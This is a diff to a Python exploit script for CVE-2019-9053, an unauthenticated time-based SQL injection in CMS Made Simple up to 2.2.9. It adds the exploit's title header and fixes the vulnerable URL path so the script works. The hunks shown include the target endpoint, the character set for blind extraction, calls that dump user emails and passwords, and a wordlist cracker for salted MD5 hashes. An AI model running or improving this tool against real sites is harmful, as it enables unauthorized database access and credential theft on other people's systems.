@@ -1,3 +1,13 @@
+#!/usr/bin/env python
+# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+# Date: 30-03-2019
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+# Version: <= 2.2.9
+# Tested on: Ubuntu 18.04 LTS
+# CVE : CVE-2019-9053
+
 import requests
 from termcolor import colored
 import time
@@ -18,7 +28,7 @@ if not options.url:
     print ("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
     exit()
 
-url_vuln = options.url + '\\moduleinterface.php?mact=News,m1_,default,0'
+url_vuln = options.url + '/moduleinterface.php?mact=News,m1_,default,0'
 session = requests.Session()
 dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
 flag = True
@@ -42,7 +52,7 @@ def crack_password():
     dict = open(wordlist)
     for line in dict.readlines():
         line = line.replace("\n", "")
-        beautify_print_try(line)   # .decode()
+        beautify_print_try(line)
         if hashlib.md5(str(salt) + line).hexdigest() == password:
             output += "\n[+] Password cracked: " + line
             break
@@ -170,7 +180,7 @@ dump_email()
 dump_password()
 
 if options.cracking:
-    print ("[*] Now try to crack password")
+    print (colored("[*] Now try to crack password"))
     crack_password()
 
 beautify_print()
